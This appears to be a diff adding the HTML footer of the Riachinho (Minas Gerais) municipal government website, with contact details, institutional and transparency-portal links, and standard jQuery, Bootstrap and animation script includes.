+								<div id="wa-comptext-k8t4cm594t6f1s" class="wa-comptext clearfix">
+									<p style="text-align: center;"><strong style="text-align: center;"><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><span style="font-size: 20px;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >EXECUÇÃO ORÇAMENTÁRIA</a></span></span><br /></strong></p>
+									<p style="text-align: center;"> </p>
+									<p style="text-align: center;"><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"><span style="color: #ffffff; font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">Nesta seção estão disponíveis dados históricos,  para consulta da Execução Orçamentária,  gestão fiscal e relatórios</span></span></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t1t1wr6ztzns" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-ku8d7agk2udke0" >
+		<div id="wa-container-ku8d7agk2udke0" class="container  " >
+			<div id="wa-row-ku8bymgs9ctbk" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-k8t46pgz7jaom8" >
+		<div id="wa-container-k8t46pgz7jaom8" class="container  " >
+			<div id="wa-row-kbw4roah5wd71c" class="row  ">
+				<div class="col-xl-12 wa-item-rowspacer"></div>
+			</div>
+			<div class="wa-container-vspacer col-xl-12"></div>
+			<div id="wa-row-k8t46pgv2vt6yo" class="row row-align  ">
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-4 col-md-4 col-lg-4 " >
+					<div id="wa-sub-container-k8t4rrfs6sggw0">
+						<div id="wa-row-k8t4rrft7jtdls" class="row row-align  ">
+							<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+								<div id="wa-sub-container-k8t4xgup6sg9q8" class=" hvr-overline-from-left ">
+									<div id="wa-row-k8t4xgup7dw77c" class="row row-align  ">
+										<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+											<div id="wa-comptext-k8t4sx1g6q98hc" class="wa-comptext clearfix">
+												<p><strong style="color: #ffffff;"><span style="font-size: 20px; font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">CONTATO</span></strong></p>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="wa-container-vspacer col-xl-12"></div>
+						<div id="wa-row-k8t4x1547bxens" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-3 " >
+								<div id="wa-comptext-k8t540y02qooe0" class="wa-comptext clearfix">
+									<p><img style="margin: 10px;" src="wa_images/endereco.png?v=1ff4vnt" width="20" height="20" alt="" title="" /></p>
+								</div>
+							</div>
+							<div class="clearfix visible-xs "></div>
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-9 wa-valign-middle " >
+								<div id="wa-comptext-k8t54jk69gjxdc" class="wa-comptext clearfix">
+									<p><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff; font-size: 13px;">Av. JK, 45, Centro Riachinho MG</span></p>
+								</div>
+							</div>
+						</div>
+						<div class="wa-container-vspacer col-xl-12"></div>
+						<div id="wa-row-k8t53zf05a9hb4" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-3 " >
+								<div id="wa-comptext-k8t541v77lzdls" class="wa-comptext clearfix">
+									<p><img style="margin: 10px;" src="wa_images/phone.png?v=1ff4vnt" width="20" height="20" alt="" title="" /></p>
+								</div>
+							</div>
+							<div class="clearfix visible-xs "></div>
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-9 wa-valign-middle " >
+								<div id="wa-comptext-k8t54km09gjrsg" class="wa-comptext clearfix">
+									<p><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;">(38) 3451-0388</span></p>
+								</div>
+							</div>
+						</div>
+						<div class="wa-container-vspacer col-xl-12"></div>
+						<div id="wa-row-k8t53zjc5a9gns" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-3 " >
+								<div id="wa-comptext-k8t548559gj660" class="wa-comptext clearfix">
+									<p><img style="margin: 10px;" src="wa_images/e-maill.png?v=1ff4vnt" width="20" height="20" alt="" title="" /></p>
+								</div>
+							</div>
+							<div class="clearfix visible-xs "></div>
+							<div class=" col-xs-12 col-sm-6 col-md-6 col-lg-9 wa-valign-middle " >
+								<div id="wa-comptext-k8t54lka9gjp00" class="wa-comptext clearfix">
+									<p><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;">contato@riachinho.mg.gov.br</span></p>
+								</div>
+							</div>
+						</div>
+						<div class="wa-container-vspacer col-xl-12"></div>
+						<div id="wa-row-kbzd2qti5gpya0" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 wa-valign-middle " >
+								<div id="wa-comptext-kbzd2qti5gguxc" class="wa-comptext clearfix">
+									<p><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="area-restrita.html"  onclick="return true;" >AREA RESTRITA</a></span></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="clearfix visible-xs "></div>
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-4 col-md-4 col-lg-4 " >
+					<div id="wa-sub-container-k8t4rrpq6sgpu8">
+						<div id="wa-row-k8t4rrpq7jtcw0" class="row row-align  ">
+							<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+								<div id="wa-sub-container-k8t4xk9n6sgsiw" class=" hvr-overline-from-left ">
+									<div id="wa-row-k8t4xk9n7dwcko" class="row row-align  ">
+										<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+											<div id="wa-comptext-k8t4wr8r4teyi8" class="wa-comptext clearfix">
+												<p><span style="color: #ffffff;"><strong><span style="font-size: 20px; font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">INSTITUCIONAL</span></strong></span></p>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="wa-container-vspacer col-xl-12"></div>
+						<div id="wa-row-k8t4wq9a7bxcgg" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+								<div id="wa-comptext-k8t4z3n822lgqw" class="wa-comptext clearfix">
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="prefeito-atual.html"  onclick="return true;" >Gabinete do Prefeito</a></span></strong></p>
+									<p><strong><span style="color: #ffffff;"> </span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="vice-prefeito-atual.html"  onclick="return true;" >Gabinete do Vice Prefeito</a></span></strong></p>
+									<p><strong><span style="color: #ffffff;"> </span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="estrutura-organizacional.html"  onclick="return true;" >Estrutura Organizacional</a></span></strong></p>
+									<p><strong><span style="color: #ffffff;"> </span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="galeria-de-ex-prefeitos.html"  onclick="return true;" >Prefeitos Anteriores</a></span></strong></p>
+									<p><strong><span style="color: #ffffff;"> </span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="#"  onclick="return true;" >Secretarias e Departamentos</a></span></strong></p>
+									<p><strong><span style="color: #ffffff;"> </span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="conselhos-municipais.html"  onclick="return true;" >Conselhos Municipais</a></span></strong></p>
+									<p><strong><span style="color: #ffffff;"> </span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="conheca-nossa-cidade.html"  onclick="return true;" >Conheça a Cidade</a></span></strong></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="clearfix visible-xs "></div>
+				<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-4 col-md-4 col-lg-4 " >
+					<div id="wa-sub-container-k8t4rryk6sgn5k">
+						<div id="wa-row-k8t4rryk7jtf1c" class="row row-align  ">
+							<div class="wa-subcontainer-wrapper  col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+								<div id="wa-sub-container-k8t4xmjg6shd40" class=" hvr-overline-from-left ">
+									<div id="wa-row-k8t4xmjg7dvv7k" class="row row-align  ">
+										<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+										<div id="wa-anchor-k8t4x26p7lz1qw" title="Anchor"></div>
+											<div id="wa-comptext-k8t4x26s7lzj6o" class="wa-comptext clearfix">
+												<p><span style="color: #ffffff;"><strong><span style="font-size: 20px; font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">TRANSPARÊNCIA</span></strong></span></p>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="wa-container-vspacer col-xl-12"></div>
+						<div id="wa-row-k8t4sw1454cdkw" class="row row-align  ">
+							<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+								<div id="wa-comptext-kbsme8s3a558xc" class="wa-comptext clearfix">
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://www.riachinho.mg.gov.br/publicacoes/"  onclick="return true;" >Obras e ações</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://www.riachinho.mg.gov.br/publicacoes/"  onclick="return true;" >Licitações</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://www.riachinho.mg.gov.br/publicacoes/"  onclick="return true;" >Contratos</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >Lei Orçamentária</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >Despesas</a> </span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >Receitas</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://www.riachinho.mg.gov.br/publicacoes/pages/esic"  onclick="return true;" >E-Sic</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://www.riachinho.mg.gov.br/publicacoes/"  onclick="return true;" >Legislação</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >Folha de Pagamento</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://www.riachinho.mg.gov.br/publicacoes/"  onclick="return true;" >Convênios</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >Prestação de Contas</a></span></strong></p>
+									<p><strong><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif; color: #ffffff;"><a style="color: #ffffff;" title="" href="portal-covid.html"  onclick="return true;" >Transparência Covid-19</a></span></strong></p>
+									<p><strong><span style="color: #ffffff;"><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"><a style="color: #ffffff;" title="" href="https://ilai.memory.com.br/#/entidades/login/9CQKE5/1/"  onclick="return true;" >Lei Responsabilidade Fiscal</a></span><span style="font-family: Montserrat, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;"> </span></span></strong></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-kcs2nc509cqdgo" >
+		<div id="wa-container-kcs2nc509cqdgo" class="container  " >
+			<div id="wa-row-kcs1nhmf4xwa7s" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comphtml-kcs1ngpf4bo5ow" >
+						<div id="FormularioWA1" data-categoria="1" data-painel="https://www.riachinho.mg.gov.br/idexmanager/"></div>
+						<script>Formulario(1);</script>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="wa-container-wrapper-k8t5bjj543c49s" >
+		<div id="wa-container-k8t5bjj543c49s" class="container-fluid  " >
+			<div id="wa-row-k8t5bjj27jtiso" class="row row-align  ">
+				<div class=" col-xs-12 col-sm-12 col-md-12 col-lg-12 " >
+					<div id="wa-comptext-k8t5c1cw7nbu5s" class="wa-comptext clearfix">
+						<p style="text-align: center;"><span style="font-size: 15px; color: #000000;"><strong><span style="font-family: Lato, Arial, Helvetica, 'Liberation Sans', FreeSans, sans-serif;">Prefeitura de Riachinho -  © 2020 | Todos os direitos Reservados. Desenvolvido por Agência Idex</span></strong></span></p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<a id="wa-anchor-bottom" title="Bottom anchor"></a>
+	<link rel="stylesheet" href="wa_bootstrap/css/bootstrap.min.css?v=125"/>
+	<link rel="stylesheet" href="wa_general.css?v=125"/>
+	<link rel="stylesheet" href="wa_style_global.css?v=17"/>
+	<link rel="stylesheet" href="wa_webfont_global.css?v=17"/>
+	<link rel="stylesheet" href="wa_animate/animate.min.css?v=125"/>
+	<link rel="stylesheet" href="wa_css/pages-home_en.css?v=780"/>
+	<script>
+		document.getElementById("preloader").style.display = 'none';
+	</script>
+	<script src="wa_bootstrap/js/jquery.min.js?v=125&" ></script>
+	<script>var wa$ = jQuery.noConflict()</script>
+	<script src="wa_js/wa_bootstrap_util.js?v=125&" ></script>
+	<script src="wa_bootstrap/js/bootstrap.min.js?v=125&" ></script>
+	<script src="wa_js/waVariables_en.js?v=31&" ></script>
+	<script src="wa_animate/wow.min.js?v=125&" ></script>
+	<script src="wa_js/validator.min.js?v=125&" ></script>
+	<script src="wa_js/wa_common.js?v=125&" ></script>
+	<script src="wa_js/parallax.js?v=125&" ></script><script src="wa_js/lazyload.min.js?v=125&" ></script>
+	<script>let wow = new WOW({boxClass:'wafxWow',animateClass: 'animated',offset:0,mobile:true,live:true,});
+	wow.init();
+	let waGridLazyLoadInstance = new LazyLoad({elements_selector: ".lazy"});
+	</script>
+</body>
+</html>
